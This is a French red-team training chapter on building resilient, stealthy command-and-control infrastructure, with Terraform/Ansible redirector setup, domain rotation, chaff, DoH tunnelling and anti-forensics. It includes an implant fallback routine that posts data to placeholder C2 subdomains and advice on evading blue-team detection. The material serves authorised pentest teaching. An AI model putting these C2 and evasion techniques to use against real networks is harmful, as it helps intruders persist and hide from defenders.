# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 21 : OPSEC Niveau 3 - Infrastructure C2 & OPSEC complexe (Partie 3)

## Partie 3 : Résilience, Rotation, OPSEC Réseau et Anti-Forensics

### Résilience & Rotation de l'infrastructure

#### Automatisation avec Terraform & Ansible

1.  **Principes de l'Infrastructure as Code (IaC) :**
    *   Définir et gérer l'infrastructure (VPS, réseaux, pare-feu) via du code.
    *   Permet la reproductibilité, la rapidité de déploiement et la gestion des versions.

2.  **Terraform pour le provisionnement :**
    *   Outil pour créer, modifier et versionner l'infrastructure de manière sûre et efficace.
    *   Permet de déployer des VPS, des règles de pare-feu, des équilibreurs de charge chez divers fournisseurs cloud (AWS, Azure, GCP, DigitalOcean, etc.).
    *   **Exemple Terraform (simplifié) pour déployer un VPS redirecteur sur DigitalOcean :**
        ```terraform
        # main.tf
        provider "digitalocean" {
          token = var.do_token
        }

        variable "do_token" {}
        variable "pvt_key" {}
        variable "pub_key" {}
        variable "ssh_fingerprint" {}

        resource "digitalocean_ssh_key" "default" {
          name       = "redirector-key"
          public_key = file(var.pub_key)
        }

        resource "digitalocean_droplet" "redirector" {
          image    = "ubuntu-22-04-x64"
          name     = "redirector-01"
          region   = "fra1" # Choisir une région
          size     = "s-1vcpu-1gb" # Choisir une taille
          ssh_keys = [digitalocean_ssh_key.default.fingerprint]
        }

        output "redirector_ip" {
          value = digitalocean_droplet.redirector.ipv4_address
        }
        ```
        *   **(Note :** Nécessite l'installation de Terraform et un token API DigitalOcean.)*

3.  **Ansible pour la configuration :**
    *   Outil d'automatisation pour configurer les systèmes, déployer des logiciels et orchestrer des tâches.
    *   Utilise des "playbooks" en YAML pour décrire les états de configuration souhaités.
    *   Permet d'installer Apache/Nginx, de configurer les redirecteurs, d'installer des outils de sécurité, etc., automatiquement après le provisionnement par Terraform.
    *   **Exemple de Playbook Ansible (simplifié) pour configurer Nginx comme redirecteur :**
        ```yaml
        # playbook.yml
        --- 
        - hosts: redirectors # Défini dans l'inventaire Ansible
          become: yes
          vars:
            c2_server_ip: "YOUR_C2_IP"
            c2_server_port: "YOUR_C2_PORT"
            domain_name: "yourdomain.com"
          tasks:
            - name: Update apt cache
              apt:
                update_cache: yes
                cache_valid_time: 3600

            - name: Install Nginx
              apt:
                name: nginx
                state: present

            - name: Install Certbot
              apt:
                name: ["certbot", "python3-certbot-nginx"]
                state: present

            - name: Configure Nginx redirector template
              template:
                src: templates/nginx_redirector.conf.j2 # Fichier Jinja2
                dest: /etc/nginx/sites-available/{{ domain_name }}
              notify: Restart Nginx

            - name: Enable Nginx site
              file:
                src: /etc/nginx/sites-available/{{ domain_name }}
                dest: /etc/nginx/sites-enabled/{{ domain_name }}
                state: link
              notify: Restart Nginx
              
            # ... (Tâches pour obtenir le certificat Let's Encrypt via Certbot)

          handlers:
            - name: Restart Nginx
              service:
                name: nginx
                state: restarted
        ```
        *   **(Note :** Nécessite l'installation d'Ansible, un inventaire des hôtes et un fichier template Jinja2 pour la configuration Nginx.)*

4.  **Avantages pour la résilience :**
    *   **Reconstruction rapide :** Si un redirecteur est brûlé, il peut être détruit et reconstruit automatiquement en quelques minutes.
    *   **Cohérence :** Assure que tous les composants de l'infrastructure sont configurés de manière identique et correcte.
    *   **Gestion des changements :** Facilite la mise à jour et la modification de l'infrastructure.

#### Rotation IP/CDN

1.  **Principe :**
    *   Changer régulièrement les adresses IP et/ou les domaines utilisés par les redirecteurs et les CDN.
    *   Rend plus difficile pour les défenseurs de bloquer l'infrastructure basée sur des indicateurs statiques.

2.  **Rotation d'IP :**
    *   Utiliser des fournisseurs de VPS qui permettent une création/destruction facile d'instances (comme avec Terraform).
    *   Utiliser des services d'IP flottantes ou élastiques qui peuvent être réassignées à de nouvelles instances.
    *   **Inconvénient :** La réputation des nouvelles IPs peut être inconnue ou mauvaise.

3.  **Rotation de domaines :**
    *   Acquérir un pool de domaines (idéalement vieillis et catégorisés).
    *   Mettre à jour les enregistrements DNS pour faire pointer les domaines vers les nouvelles IPs des redirecteurs.
    *   Utiliser des sous-domaines pour une rotation plus granulaire.
    *   **Automatisation :** Utiliser les API des registraires de domaines et des fournisseurs DNS pour automatiser les mises à jour.

4.  **Rotation via CDN :**
    *   Changer le domaine configuré dans le CDN.
    *   Changer l'adresse IP d'origine configurée dans le CDN (pointe vers un nouveau redirecteur).
    *   Les IPs du CDN elles-mêmes changent rarement, mais le point d'entrée (domaine) et le backend (redirecteur) peuvent être tournés.

#### Swap de sous-domaines DNS

1.  **Principe :**
    *   Utiliser plusieurs sous-domaines (ex: `api1.yourdomain.com`, `api2.yourdomain.com`) pointant vers différents redirecteurs ou la même infrastructure.
    *   Configurer les implants pour essayer différents sous-domaines si l'un d'eux est bloqué.
    *   Permet une rotation rapide sans changer le domaine principal.

2.  **Mise en œuvre :**
    *   Configurer plusieurs enregistrements A ou CNAME pour les sous-domaines.
    *   Implémenter la logique de fallback dans l'implant C2.
    *   **Exemple (logique implant simplifiée) :**
        ```python
        c2_subdomains = ["api1.yourdomain.com", "api2.yourdomain.com", "cdn.yourdomain.com"]
        primary_c2 = c2_subdomains[0]
        
        def contact_c2(data):
            global primary_c2
            for subdomain in [primary_c2] + [s for s in c2_subdomains if s != primary_c2]:
                try:
                    response = requests.post(f"https://{subdomain}/submit", data=data, timeout=5)
                    if response.status_code == 200:
                        primary_c2 = subdomain # Mémoriser le dernier succès
                        return response.content
                except requests.exceptions.RequestException:
                    continue # Essayer le suivant
            return None # Échec après tous les essais
        ```

### OPSEC Réseau avancé

#### Chaff et Decoys

1.  **Principe du Chaff (Leurre) :**
    *   Générer du trafic réseau bénin supplémentaire pour masquer le trafic C2 réel.
    *   Rendre plus difficile l'identification des patterns de beaconing.

2.  **Techniques de Chaff :**
    *   **Trafic HTTP/S aléatoire :** L'implant effectue des requêtes GET aléatoires vers des sites web légitimes (Google, Wikipedia, etc.) entre les beacons C2.
    *   **Trafic DNS aléatoire :** L'implant effectue des requêtes DNS aléatoires pour des domaines légitimes.
    *   **Trafic réseau diversifié :** Générer du trafic NTP, ICMP, etc.
    *   **Implémentation :** Peut être intégré dans le code de l'implant ou exécuté par un processus séparé.

3.  **Serveurs Leurres (Decoys) - Rappel :**
    *   Configurer les redirecteurs ou des serveurs dédiés pour répondre aux scans ou aux connexions non sollicitées avec du contenu légitime.
    *   Détourne l'attention et rend l'identification de l'infrastructure C2 plus difficile.

#### Tunneling HTTP/2 et HTTP/3

1.  **Avantages OPSEC :**
    *   **Multiplexage :** HTTP/2 et HTTP/3 permettent plusieurs flux de données sur une seule connexion TCP/UDP, masquant potentiellement les requêtes C2 individuelles parmi d'autres requêtes.
    *   **Chiffrement :** HTTP/3 utilise QUIC, qui est chiffré par défaut (UDP), rendant l'inspection plus difficile que TCP/TLS.
    *   **Moins courant pour C2 :** Peut échapper aux signatures basées sur HTTP/1.1.

2.  **Mise en œuvre :**
    *   Nécessite un serveur web (redirecteur) et un client (implant) compatibles HTTP/2 ou HTTP/3.
    *   Nginx et Apache supportent HTTP/2. Le support HTTP/3 est en développement (ex: Nginx avec le module `ngx_http_v3_module`, Caddy Server).
    *   Les frameworks C2 modernes commencent à intégrer le support HTTP/2 et QUIC.

#### DoH (DNS over HTTPS) / DoT (DNS over TLS)

1.  **Principe :**
    *   Encapsuler les requêtes DNS dans des connexions HTTPS (DoH) ou TLS (DoT).
    *   Chiffre les requêtes DNS, les rendant invisibles aux écoutes passives sur le réseau.

2.  **Avantages OPSEC :**
    *   Masque les domaines C2 interrogés par les implants.
    *   Contourne le filtrage DNS basé sur les requêtes UDP/53 classiques.
    *   Le trafic se fond dans le trafic HTTPS normal.

3.  **Mise en œuvre :**
    *   L'implant doit utiliser une bibliothèque cliente DoH/DoT.
    *   Utiliser des résolveurs DoH/DoT publics (Cloudflare 1.1.1.1, Google 8.8.8.8, Quad9) ou un résolveur privé contrôlé par l'attaquant.
    *   **Exemple (utilisation de `curl` pour DoH) :**
        ```bash
        # Résoudre c2domain.com via Cloudflare DoH
        curl -s -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=c2domain.com&type=A'
        ```

#### Split-Tunnel WireGuard

1.  **Principe du VPN Split-Tunnel :**
    *   Permet à un appareil connecté à un VPN de router une partie de son trafic via le tunnel VPN et l'autre partie directement vers Internet.

2.  **Application à l'OPSEC C2 :**
    *   **Scénario 1 (Serveur C2) :** Le serveur C2 utilise un VPN WireGuard avec split-tunnel. Seul le trafic de gestion (SSH, etc.) passe par le VPN, tandis que le trafic C2 entrant/sortant utilise l'IP publique directe du serveur (masquée par les redirecteurs).
    *   **Scénario 2 (Opérateur) :** L'opérateur se connecte au serveur C2 via un VPN WireGuard. Le split-tunnel permet à l'opérateur d'accéder à Internet normalement tout en sécurisant la connexion au C2.
    *   **Scénario 3 (Redirecteur -> C2) :** La connexion entre le redirecteur et le serveur C2 peut être établie via un tunnel WireGuard dédié, potentiellement en split-tunnel sur le redirecteur si nécessaire.

3.  **Configuration WireGuard (Split-Tunnel) :**
    *   Utiliser le paramètre `AllowedIPs` dans la configuration du peer.
    *   Pour un split-tunnel où seul le trafic vers un réseau spécifique passe par le VPN :
        ```ini
        # Configuration client (peer)
        [Interface]
        PrivateKey = CLIENT_PRIVATE_KEY
        Address = 10.0.0.2/32 # IP du client dans le VPN
        DNS = 10.0.0.1 # DNS du serveur VPN
        
        [Peer] # Configuration du serveur VPN
        PublicKey = SERVER_PUBLIC_KEY
        PresharedKey = PRESHARED_KEY # Optionnel
        Endpoint = vpn.server.com:51820
        AllowedIPs = 10.0.0.1/32, 192.168.50.0/24 # Seul le trafic vers le serveur VPN et le réseau 192.168.50.0/24 passe par le tunnel
        PersistentKeepalive = 25
        ```
    *   Pour un split-tunnel où tout le trafic passe par le VPN *sauf* certains réseaux :
        *   Mettre `AllowedIPs = 0.0.0.0/0, ::/0`
        *   Utiliser des règles de routage système (`ip route` sur Linux, `route add` sur Windows) ou des règles de pare-feu pour exclure le trafic souhaité du tunnel.

### Détection côté Blue Team et Techniques d'Obfuscation

#### Indicateurs de détection avancés

1.  **JA3/JA3S Fingerprinting :**
    *   Empreinte digitale basée sur les paramètres de la négociation TLS (Client Hello pour JA3, Server Hello pour JA3S).
    *   Permet d'identifier des clients ou serveurs TLS spécifiques, même si l'IP ou le domaine change.
    *   Les outils C2 par défaut ont souvent des empreintes JA3 connues.
    *   **Obfuscation :** Utiliser des bibliothèques TLS différentes, modifier les chiffrements proposés (Cipher Suites), utiliser des outils comme `cyu` ou des proxys modifiant le TLS handshake.

2.  **Analyse SNI (Server Name Indication) :**
    *   Le SNI (envoyé en clair lors du TLS handshake) révèle le nom d'hôte auquel le client tente de se connecter.
    *   Permet de détecter les connexions vers des domaines C2 connus, même derrière des CDN.
    *   **Obfuscation :** Domain Fronting (limité), Encrypted SNI (ESNI) / Encrypted Client Hello (ECH) - technologies émergentes pour chiffrer le SNI.

3.  **Analyse NetFlow/Beaconing :**
    *   Analyse des métadonnées du trafic (IPs, ports, volume, durée, timing) sans déchiffrer le contenu.
    *   Permet de détecter les patterns de communication réguliers (beaconing) typiques des C2, même chiffrés.
    *   **Obfuscation :** Jitter important, sleep longs et variables, trafic de chaff, communication déclenchée par des événements plutôt que par intervalles fixes.

#### Techniques d'obfuscation (Légales vs Illégales)

1.  **Padding (Rembourrage) :**
    *   Ajouter des données aléatoires aux paquets C2 pour masquer la taille réelle des données utiles.
    *   Rend plus difficile la détection basée sur la taille des paquets.
    *   **Légalité :** Généralement considéré comme une technique d'obfuscation légitime dans le cadre d'un pentest/red team.

2.  **Canary Domains/Tokens :**
    *   Intégrer des domaines ou des tokens spécifiques dans le trafic C2.
    *   Si ces canaris sont détectés ou bloqués par la Blue Team, cela alerte l'attaquant que son infrastructure est compromise ou analysée.
    *   **Légalité :** Technique légitime.

3.  **Chiffrement personnalisé :**
    *   Utiliser des algorithmes de chiffrement ou des implémentations non standard pour le trafic C2.
    *   Rend l'analyse du trafic plus difficile si les clés ne sont pas compromises.
    *   **Légalité :** Technique légitime.

4.  **Steganographie :**
    *   Cacher les données C2 dans des fichiers apparemment bénins (images, audio, vidéo).
    *   **Légalité :** Technique légitime, bien que potentiellement suspecte.

5.  **Altération des logs (Illégal/Non éthique) :**
    *   Modifier ou supprimer les logs sur les systèmes compromis ou l'infrastructure C2 pour effacer les traces.
    *   **À proscrire absolument** dans un cadre éthique.

6.  **Utilisation d'infrastructures compromises (Illégal/Non éthique) :**
    *   Utiliser des serveurs ou des sites web piratés comme redirecteurs ou serveurs C2.
    *   **À proscrire absolument.**

### Anti-Forensics Éthique pour l'Infrastructure

#### Exécution In-Memory sur l'Infrastructure

1.  **Serveurs C2 :**
    *   Faire tourner le serveur C2 (Team Server) en mémoire si possible (dépend du framework).
    *   Stocker les configurations et les données sensibles en mémoire ou sur des volumes chiffrés montés temporairement.

2.  **Redirecteurs :**
    *   Utiliser des configurations minimales.
    *   Éviter de stocker des logs persistants (rediriger vers `/dev/null`).
    *   Utiliser des systèmes d'exploitation live ou des conteneurs jetables si possible.

#### Nettoyage Minimal et Raisonné

1.  **Objectif :** Supprimer les artefacts spécifiques à l'opération (outils, scripts, logs temporaires de l'attaquant) sans altérer les logs système ou les données légitimes.
2.  **Sur les Redirecteurs :**
    *   Supprimer les fichiers de configuration spécifiques à l'opération après la fin.
    *   Nettoyer l'historique des commandes de l'opérateur.
    *   Utiliser `sdelete` ou `shred` avec précaution pour les fichiers temporaires de l'attaquant.
3.  **Sur le Serveur C2 :**
    *   Supprimer les logs de session spécifiques à l'opération.
    *   Exporter et supprimer les données collectées après l'opération.
    *   Nettoyer l'historique des commandes.
4.  **Automatisation :** Intégrer des étapes de nettoyage dans les scripts Ansible ou Terraform lors de la destruction de l'infrastructure.

#### Conformité aux Règles d'Engagement

-   **Documentation :** Documenter précisément toutes les techniques d'anti-forensics utilisées sur l'infrastructure.
-   **Autorisation :** S'assurer que les techniques utilisées sont explicitement autorisées dans les règles d'engagement.
-   **Minimisation :** N'utiliser que les techniques nécessaires pour atteindre les objectifs de simulation et de furtivité, sans aller jusqu'à l'altération illégale.

### Scénarios d'Exercice : Déploiement et Validation OPSEC

#### Script de déploiement complet

1.  **Objectif :** Créer un script (ou une combinaison Terraform/Ansible) qui déploie automatiquement une infrastructure C2 minimale mais OPSEC-aware (ex: 1 Team Server + 1 Redirecteur Nginx + Domaine + Certificat SSL + Filtrage de base).
2.  **Composants du script :**
    *   Provisionnement du VPS pour le redirecteur (Terraform).
    *   Configuration du redirecteur (Nginx, SSL, filtrage) (Ansible).
    *   Configuration DNS du domaine.
    *   (Optionnel) Provisionnement et configuration de base du Team Server.
3.  **Exemple (pseudo-code / étapes) :**
    ```bash
    #!/bin/bash
    # 1. Variables (Tokens API, Domaine, IP C2, etc.)
    # ...
    
    # 2. Exécuter Terraform pour créer le VPS redirecteur
    # terraform apply -auto-approve
    # Récupérer l'IP du redirecteur
    REDIRECTOR_IP=$(terraform output redirector_ip)
    
    # 3. Mettre à jour le DNS du domaine pour pointer vers REDIRECTOR_IP
    # Utiliser l'API du fournisseur DNS (Cloudflare, GoDaddy, etc.)
    # ... 
    
    # 4. Attendre la propagation DNS
    # sleep 120
    
    # 5. Exécuter Ansible pour configurer le redirecteur
    # ansible-playbook -i inventory.ini playbook.yml --extra-vars "redirector_ip=$REDIRECTOR_IP"
    
    # 6. Démarrer le Team Server C2 (manuellement ou scripté)
    # ./teamserver C2_IP PASSWORD profile.profile
    
    # 7. Vérifier la configuration
    # curl -k -H "Host: yourdomain.com" https://$REDIRECTOR_IP/ # Devrait être bloqué ou montrer le leurre
    # curl -k -H "Host: yourdomain.com" -H "User-Agent: Leg1t_UA" https://$REDIRECTOR_IP/c2_uri # Devrait passer (si UA autorisé)
    ```

#### Checklist de validation OPSEC

**(À utiliser avant et pendant l'opération)**

**Infrastructure :**
*   [ ] Le Team Server est-il isolé et non directement exposé ?
*   [ ] Les redirecteurs sont-ils configurés avec un filtrage adéquat (UA, URI, Headers, IP) ?
*   [ ] Un serveur leurre est-il en place pour le trafic non-C2 ?
*   [ ] Les domaines utilisés sont-ils crédibles et correctement catégorisés ?
*   [ ] Les certificats SSL sont-ils valides et non suspects ?
*   [ ] La connexion Redirecteur -> Team Server est-elle sécurisée (VPN/SSH/mTLS) ?
*   [ ] L'infrastructure est-elle déployée via IaC (Terraform/Ansible) pour la résilience ?
*   [ ] Un plan de rotation (IP/Domaine) est-il en place ?
*   [ ] Les logs sur les redirecteurs sont-ils minimisés ou désactivés ?

**Communication C2 :**
*   [ ] Le profile C2 (Malleable/Sliver/Mythic) est-il personnalisé et imite-t-il du trafic légitime ?
*   [ ] Le timing (Sleep/Jitter) est-il configuré pour être discret et variable ?
*   [ ] Le User-Agent et les headers HTTP sont-ils cohérents et crédibles ?
*   [ ] Des techniques d'obfuscation supplémentaires sont-elles utilisées (Padding, Chiffrement personnalisé) ?
*   [ ] L'utilisation de DoH/DoT est-elle envisagée pour les requêtes DNS ?
*   [ ] Le trafic de Chaff est-il utilisé pour masquer le beaconing ?

**Opérations :**
*   [ ] Les outils sont-ils exécutés en mémoire autant que possible ?
*   [ ] Les artefacts temporaires sont-ils nettoyés régulièrement et de manière éthique ?
*   [ ] L'historique des commandes est-il géré avec soin ?
*   [ ] Les techniques utilisées sont-elles conformes aux règles d'engagement ?
*   [ ] La surveillance des indicateurs de détection (Canary Tokens, logs Blue Team si accessibles) est-elle active ?

### Points clés (Partie 3)

-   La résilience de l'infrastructure C2 est assurée par l'automatisation (Terraform, Ansible) et la rotation (IP, domaines, CDN).
-   L'OPSEC réseau avancé inclut le Chaff, le tunneling HTTP/2-3, et l'utilisation de DoH/DoT pour masquer les communications.
-   Les Blue Teams utilisent des indicateurs avancés comme JA3/JA3S, l'analyse SNI et NetFlow pour détecter les C2 sophistiqués.
-   L'anti-forensics éthique sur l'infrastructure se concentre sur l'exécution en mémoire et le nettoyage raisonné, en évitant l'altération illégale.
-   Le déploiement automatisé et une checklist de validation OPSEC sont essentiels pour maintenir une posture sécurisée.

**(Fin de la Partie 3 et du Chapitre 21)**
